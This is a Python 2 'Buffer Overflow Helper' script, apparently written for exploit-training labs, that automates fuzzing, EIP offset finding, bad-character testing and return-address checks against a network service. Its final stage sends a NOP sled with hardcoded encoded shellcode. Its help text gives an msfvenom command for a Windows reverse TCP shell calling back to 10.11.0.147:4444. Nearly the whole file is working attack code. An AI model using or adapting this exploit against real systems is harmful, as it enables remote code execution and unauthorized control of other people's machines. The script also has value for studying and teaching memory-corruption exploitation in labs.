#!/usr/bin/python
import sys, socket
from time import sleep
import argparse
import subprocess

#Positional (required) arguments
parser = argparse.ArgumentParser(description='Buffer Overflow Helper', formatter_class = argparse.RawTextHelpFormatter)

parser.add_argument('host',help="Remote target host, e.g. 10.10.1.14")
parser.add_argument('port', help="Remote target port, e.g. 9999", type=int)
parser.add_argument('function', help="Function used in buffer overflow attempt, e.g. TRUN")
parser.add_argument('program', help="Enter a number, 1-6, as argument: \n\n1. Fuzzing \n2. Identifying Offset \n\tREQUIRES -pattern \n3. Overwriting EIP \n\tREQUIRES -offset\n4. Identify Bad Characters \n\tREQUIRES -offset\n5. Return Address \n\tREQUIRES -offset && -ret\n6. Final Payload \n\tREQUIRES -offset && -ret && -pay\n\n********************************\nSuggested additional resources:\n\nPattern creation (Identifying offset):\n\tpattern_create.rb\n\tpattern_offset.rb\n\nLocating return address:\n\tmona.py\n\tnasm_shell.rb\n\nCreating payload:\n\tmsfvenom \n********************************\n\nHappy Hacking you Hackney Hip-Swaying Hokey Pokers :)\n\n", type=int)


#Optional arguments
parser.add_argument('-pattern', help="Use w/ PROGRAM 2\n\nPattern created using pattern-create.rb\n\nOn kali, this is the output from: \n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <number from fuzzing phase> \n\nTo identify the offset, enter the characters in EIP into:\n\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <number> -q <EIP characters>\n\n", type=str)
parser.add_argument('-offset', help="Use w/ PROGRAMS 3, 4, 5, and 6\n\nOffset value: e.g. 2020\n\n", type=int)
parser.add_argument('-ret', help="Use w/ PROGRAMS 5 and 6\n\nEnter return address as it will be entered in EIP\n\ne.g.,for return address 625011af, one might enter \\\\xaf\\\\x11\\\\x50\\\\x62\n\n", type=str)
parser.add_argument('-pay', help="Use w/ PROGRAM 6\n\nEnter shellcode\n\ne.g. Output from command:\n\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.147 LPORT=4444 EXITFUNC=thread -f c -a x86 -b \"<INSERT BAD CHARS HERE e.g. null byte: \\x00>\"\n\n", type=str)
parser.add_argument('-nops', help="Use w/ PROGRAM 6\n\nEnter number of nops preceding payload, e.g. 32\n\n", type=int)

args = parser.parse_args()

#Global variables
ip = args.host
port = args.port
function = args.function

#Fuzz
if args.program == 1:
    buffer = "A" * 100
    print("Fuzzing, Motherfuzzer!!")
    while True:
    	try:
       	    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
	    print repr(s.recv(1024))
            s.send((function + " " + buffer))
  	    print repr(s.recv(1024))
            sleep(1)
	    s.close()
	    print("%s bytes sent") % str(len(buffer))
            buffer = buffer + "A" * 100
        except:
            print "Either something has gone wrong or you've crashed with %s bytes" % str(len(buffer))
            sys.exit()
 	

#Find Offset            
elif args.program == 2:
    pattern = args.pattern 
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
	print repr(s.recv(1024))
        s.send((function + " " + pattern))
  	print repr(s.recv(1024))
        s.close()
        print("Pattern sent - check EIP for pattern characters\n\nTo identify offset, enter these characters into the following:\n\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <number> -q <EIP characters>")
    except:
        print "Error connecting to server"
        sys.exit()

#Overwriting EIP
elif args.program == 3:
    offset = args.offset
    overwrite = "A" * offset + "B" * 4

    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
	print repr(s.recv(1024))
        s.send((function + " " + overwrite))
  	print repr(s.recv(1024))
        s.close()
        sleep(1)
	print ("If successful, EIP will be overwritten with \"42424242\"")

    except:
        print "Error connecting to server"
        sys.exit()

#Identify Bad Characters
elif args.program == 4:
    offset = args.offset
    badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

    bad_payload = "A" * offset + "B" * 4 + badchars

    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
	print repr(s.recv(1024))
        s.send((function + " " + bad_payload))
  	print repr(s.recv(1024))
        s.close()
        sleep(1)
	print("\nSend the values from the appropriate register (e.g. ESP) to the hex dump and check for missing or out of place characters - these indicate bad characters\n\nIf bad characters are suspected, remove them from the badchars variable in program 4 and run, again.\n\nIf successful, the following characters were sent.\n\n   01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f\n20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30 31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f \n40 41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50 51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f\n60 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f\n80 81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f 90 91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f\na0 a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf\nc0 c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf d0 d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df\ne0 e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef f0 f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff\n\nNOTE: 00 is NOT included in the characters sent.\nAdd \\x00 to the badchars variable it if you wish to test null bytes.")

    except:
        print "Error connecting to server"
        sys.exit()

#Return Address
elif args.program == 5:

    offset = args.offset
    return_addr = args.ret
    return_payload= "A" * offset + return_addr
  
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
	print repr(s.recv(1024))
        s.send((function + " " + return_payload))
  	print repr(s.recv(1024))
        sleep(1)
	print ("\nSee if your return address lands in EIP by setting a breakpoint on the return address.\n\nBe sure that you escaped \\ characters in the -ret argument. \ne.g.,for return address 625011af, one might enter \\\\xaf\\\\x11\\\\x50\\\\x62\n\n")
	
    except:
        print "Error connecting to server"
        sys.exit()

#Final Payload
elif args.program == 6:
    	#shell = args.pay
    	shell =  ""
	shell += "\xdb\xcd\xd9\x74\x24\xf4\x58\x29\xc9\xba\x15\x3f\x62"
	shell += "\xca\xb1\x52\x31\x50\x17\x03\x50\x17\x83\xfd\xc3\x80"
	shell += "\x3f\x01\xd3\xc7\xc0\xf9\x24\xa8\x49\x1c\x15\xe8\x2e"
	shell += "\x55\x06\xd8\x25\x3b\xab\x93\x68\xaf\x38\xd1\xa4\xc0"
	shell += "\x89\x5c\x93\xef\x0a\xcc\xe7\x6e\x89\x0f\x34\x50\xb0"
	shell += "\xdf\x49\x91\xf5\x02\xa3\xc3\xae\x49\x16\xf3\xdb\x04"
	shell += "\xab\x78\x97\x89\xab\x9d\x60\xab\x9a\x30\xfa\xf2\x3c"
	shell += "\xb3\x2f\x8f\x74\xab\x2c\xaa\xcf\x40\x86\x40\xce\x80"
	shell += "\xd6\xa9\x7d\xed\xd6\x5b\x7f\x2a\xd0\x83\x0a\x42\x22"
	shell += "\x39\x0d\x91\x58\xe5\x98\x01\xfa\x6e\x3a\xed\xfa\xa3"
	shell += "\xdd\x66\xf0\x08\xa9\x20\x15\x8e\x7e\x5b\x21\x1b\x81"
	shell += "\x8b\xa3\x5f\xa6\x0f\xef\x04\xc7\x16\x55\xea\xf8\x48"
	shell += "\x36\x53\x5d\x03\xdb\x80\xec\x4e\xb4\x65\xdd\x70\x44"
	shell += "\xe2\x56\x03\x76\xad\xcc\x8b\x3a\x26\xcb\x4c\x3c\x1d"
	shell += "\xab\xc2\xc3\x9e\xcc\xcb\x07\xca\x9c\x63\xa1\x73\x77"
	shell += "\x73\x4e\xa6\xd8\x23\xe0\x19\x99\x93\x40\xca\x71\xf9"
	shell += "\x4e\x35\x61\x02\x85\x5e\x08\xf9\x4e\x6b\xc6\x01\x1c"
	shell += "\x03\xda\x01\x33\x88\x53\xe7\x59\x20\x32\xb0\xf5\xd9"
	shell += "\x1f\x4a\x67\x25\x8a\x37\xa7\xad\x39\xc8\x66\x46\x37"
	shell += "\xda\x1f\xa6\x02\x80\xb6\xb9\xb8\xac\x55\x2b\x27\x2c"
	shell += "\x13\x50\xf0\x7b\x74\xa6\x09\xe9\x68\x91\xa3\x0f\x71"
	shell += "\x47\x8b\x8b\xae\xb4\x12\x12\x22\x80\x30\x04\xfa\x09"
	shell += "\x7d\x70\x52\x5c\x2b\x2e\x14\x36\x9d\x98\xce\xe5\x77"
	shell += "\x4c\x96\xc5\x47\x0a\x97\x03\x3e\xf2\x26\xfa\x07\x0d"
	shell += "\x86\x6a\x80\x76\xfa\x0a\x6f\xad\xbe\x2b\x92\x67\xcb"
	shell += "\xc3\x0b\xe2\x76\x8e\xab\xd9\xb5\xb7\x2f\xeb\x45\x4c"
	shell += "\x2f\x9e\x40\x08\xf7\x73\x39\x01\x92\x73\xee\x22\xb7"
	
	offset = args.offset
    	nops = "\x90" * args.nops
    	return_addr = args.ret
    	shellcode = "A" * offset + return_addr + nops + shell
	print (shellcode)

    	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	       	s.connect((ip, port))
		print repr(s.recv(1024))
		s.send((function + " " + shellcode))
	  	print repr(s.recv(1024))
		sleep(1)
		s.close()

	except:
		print "Error connecting to server"
		sys.exit()

else: 
    print("-h for help")
